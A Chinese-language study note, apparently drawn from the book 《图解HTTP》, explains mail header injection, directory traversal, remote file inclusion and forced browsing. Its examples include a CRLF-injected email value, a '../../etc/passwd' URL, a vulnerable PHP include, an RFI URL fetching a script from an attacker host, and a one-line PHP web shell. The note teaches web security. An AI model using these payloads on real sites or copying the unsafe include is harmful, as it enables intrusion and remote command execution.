# Web的攻击技术

---
绝大多数内容引自《图解HTTP》
---

## 邮件首部注入攻击

邮件首部注入（Mail Header Injection) 是指Web应用中的邮件发送功能，攻击者通过向邮件首部To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。

- 邮件首部注入攻击案列

下面以Web页面中的咨询表单为例讲解邮件首部注入攻击。该功能可以在表单内填入咨询者的邮件地址及咨询内容后，以邮件的形式发送给网站管理员。

攻击者将以下数据作为邮件地址发起请求。

```
bob@hackr.jp%0D%0ABcc: user@example.com
```

%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的Web应用接收了这个换行符，就可能实现对Bcc邮件地址的追加发送，而这原本是无法指定的。

另外像下面一样，使用两个连续的换行符就有肯呢个篡改邮件文本内容并发送。

```
bob@hackr.jp%0D%0A%0D%0ATest Message
```

再以相同的方法，就有可能改写篡改邮件文本内容并发送。

再以相同的方法，就有可能改写To和 Subject 等任意邮件首部，或向文本添加附件等动作。

## 目录遍历攻击

目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历(Path Traversal)攻击。

通过Web应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用.../等相对路径定位到/etc/passed 等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除Web服务器上的文件。

固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限。

- 目录遍历攻击案列

下面以显示读取文件功能为例，讲解目录比阿尼攻击。该功能通过以下查询字段，指定某个文件名。然后从/www/log/文件目录下读取这个指定的文件。

```
http://example.com/read.php?log=0401.log
```

攻击者设置如下查询字段后发出请求。

```
http://example.com/read.php?log=../../etc/passwd
```

查询字段为了读取攻击者盯上的/etc/passwd 文件，会从/www/log/目录开始定位相对路径。如果这份 read.php脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。

## 远程文件包含漏洞

远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可以运行任意脚本的一种攻击。

这主要是PHP存在的安全漏洞，对PHP的include或require来说，这是一种可通过设定，指定外部服务器URL作为文件名的功能。但是，该功能太危险了， PHP5.2.0之后默认设定此功能无效。

固然存在输出值转义的问题，但更应控制对任意文件名的指定。

- 远程文件包含漏洞的攻击案列

下面以include读入由查询字段指定文件的功能为例，讲解远程文件包含漏洞。该功能可通过以下查询字段形式指定文件名，并在脚本内的include语句处读入这个指定文件。

```
http://example.com/foo.php?mod=news.php
```

对应脚本的源代码如下所示。

```
$modname = $_GET['mod'];
include($modname);
```

攻击者指定如同下面形式的URL发出请求。

```
http://example.com/foo.php?mod=http://hackr.jp/cmd.php&cmd=ls
```

攻击者已事先在外部服务器上准备了一下这段脚本。

```
<? system($_GET['cmd']) ?>
```

假设Web服务器(example.com)的include可以引入外部服务器的URL，那就会读入攻击者在外部服务器上事先准备的URL（http://hackr.jp/cmd.php)。结果，通过system函数就能在Web服务器（example.com）上执行查询字段指定的OS命令了。


在以上攻击案列中，执行了可显示Web服务器（example.com）上文件及目录信息的ls命令。

# 因设置或设计上的缺陷应发的安全漏洞

因设置或设计上的缺陷引发的安全漏洞是指，错误设置Web服务器，或是由设计上的一些问题引起的安全漏洞。

## 强制浏览

强制浏览（Forced Browsing）安全漏洞是指，从安置在Web服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。

强制浏览有可能会造成以下一些影响。

- 泄漏顾客的个人信息等重要情报
- 泄漏原本需要具有访问权限的用户才可查阅的信息内容
- 泄漏为外链到外界的文件

对那些原本不愿公开的文件，为了保证安全会隐蔽其URL。可一旦知道了哪些URL，也就意味着可浏览URL对应的文件。直接显示容易推测的文件名或文件目录索引时，通过某些方法可能会使URL产生泄漏。

